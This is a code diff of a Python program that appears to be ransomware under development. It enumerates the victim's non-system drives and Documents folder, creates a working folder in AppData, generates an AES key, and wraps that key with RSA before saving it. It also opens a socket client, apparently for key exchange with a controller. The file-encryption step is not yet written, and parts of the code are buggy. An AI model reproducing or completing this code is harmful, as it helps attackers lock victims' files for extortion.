@@ -3,13 +3,72 @@ import json
 import string
 import random
 import hashlib
-import socket
-import secrets
 import datetime
-#from mysocket import MySocket
+import heapq
+from mysocket import MySocket
+from collections import Counter
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+from Crypto.PublicKey import RSA
 
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
+
+import heapq
+from collections import Counter
+
+class __HuffmanNode:
+    def __init__(self, freq, symbol=None, left=None, right=None):
+        self.freq = freq
+        self.symbol = symbol
+        self.left = left
+        self.right = right
+
+    def __lt__(self, other):
+        return self.freq < other.freq
+
+class __HuffmanCoding:
+    def __init__(self):
+        self.tree = None
+        self.codebook = {}
+
+    def build_huffman_tree(self, text):
+        frequency = Counter(text)
+        heap = [__HuffmanNode(freq, symbol) for symbol, freq in frequency.items()]
+        heapq.heapify(heap)
+
+        while len(heap) > 1:
+            left = heapq.heappop(heap)
+            right = heapq.heappop(heap)
+            merged = __HuffmanNode(left.freq + right.freq, left=left, right=right)
+            heapq.heappush(heap, merged)
+
+        self.tree = heap[0]
+        return self.tree
+
+    def build_codes(self, node, prefix=""):
+        if node.symbol is not None:
+            self.codebook[node.symbol] = prefix
+        else:
+            self.build_codes(node.left, prefix + "0")
+            self.build_codes(node.right, prefix + "1")
+
+    def huffman_encode(self, text):
+        self.tree = self.build_huffman_tree(text)
+        self.build_codes(self.tree)
+        encoded_text = ''.join(self.codebook[symbol] for symbol in text)
+        return encoded_text
+
+    def huffman_decode(self, encoded_text):
+        decoded_text = []
+        node = self.tree
+        for bit in encoded_text:
+            node = node.left if bit == '0' else node.right
+            if node.symbol is not None:
+                decoded_text.append(node.symbol)
+                node = self.tree
+        return ''.join(decoded_text)
 
 class Mycrypto:
     def checkfile():
@@ -30,6 +89,44 @@ class Mycrypto:
             print("No found")
             return 0
     
+    def __aesKey(length=16):
+        return get_random_bytes(length)
+    
+    def __aesEncrypt(key,plaintext):
+        cipher = AES.new(key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+        iv = cipher.iv
+        return iv + ct_bytes
+    
+    def __aesDecrypt(key,ciphertext):
+        iv = ciphertext[:16]
+        ct = ciphertext[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        pt = unpad(cipher.decrypt(ct), AES.block_size)
+        return pt.decode()
+    
+    def __rasKey(length=2048):
+        return RSA.generate(length)
+    
+    def __rasEncrypt(aseKey,rasPublicKey):
+        cipher = PKCS1_OAEP.new(rasPublicKey)
+        return cipher.encrypt(aseKey)
+
+    def __rasDecrypt(enAseKey,rasPrivateKey):
+        cipher = PKCS1_OAEP.new(rasPrivateKey)
+        return cipher.decrypt(enAseKey)
+    
+    def _getAvaiblableDrives():
+        drives = []
+        for letter in string.ascii_uppercase:
+            drive = letter + ":/"
+            if os.path.exists(drive):
+                drives.append(drive)
+        drives.remove("C:/")
+        drives.append(f"C:/Users/{os.getlogin()}/Documents")
+        return drives
+    
+
     class __createFile:
         def __init__(self,path):
             self.path = path
@@ -62,44 +159,38 @@ class Mycrypto:
             with open(rmfilePath,"w") as file:
                 json.dump(data,file,indent=4)
 
+        def writeKeyFile(self,key):
+            rmfilePath = self.path + "/" + "key.json"
+            data = {"key":key}
+            with open(rmfilePath,"w") as file:
+                json.dump(data,file,indent=4)
+        
+        def readKeyFile(self):
+            rmfilePath = self.path + "/" + "key.json"
+            with open(rmfilePath,"r") as file:
+                key = json.load(file)
+            return key
 
-def _getAvaiblableDrives():
-    drives = []
-    for letter in string.ascii_uppercase:
-        drive = letter + ":/"
-        if os.path.exists(drive):
-            drives.append(drive)
-    drives.remove("C:/")
-    drives.append(f"C:/Users/{os.getlogin()}/Documents")
-    return drives
 
-def __Encryprion(path):
-    def __getPublicKey():
-        recevice = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        recevice.connect(("localhost",8888))
-        publicKey = recevice.recv(4096)
-        return publicKey
-    
-    def __generateAESKey(key_length=16):
-        key = secrets.token_bytes(key_length)
-        key = key.hex()
-        return key
-
-    encryptFilePath = []
-    publicKey = __getPublicKey()
-    aeskey = __generateAESKey(32)
-
-    
 
 def runEncryption():
     print("Encryption start")
 
     __cf = Mycrypto.__createFile(testPath)
     __cf.checkfile("lock.json")
-    drives = _getAvaiblableDrives()
+    drives = Mycrypto._getAvaiblableDrives()
     print(drives)
 
-    #__Encryprion(drives)
+    aseKey = Mycrypto.__aesKey()
+    
+    rasKey = Mycrypto.__rasKey()
+    publicKey = rasKey.publickey()
+
+    enkey = Mycrypto.__rasEncrypt(aseKey,publicKey)
+    __cf.writeKeyFile(enkey)
+
+    client = MySocket.Client()
+    
     
 
 
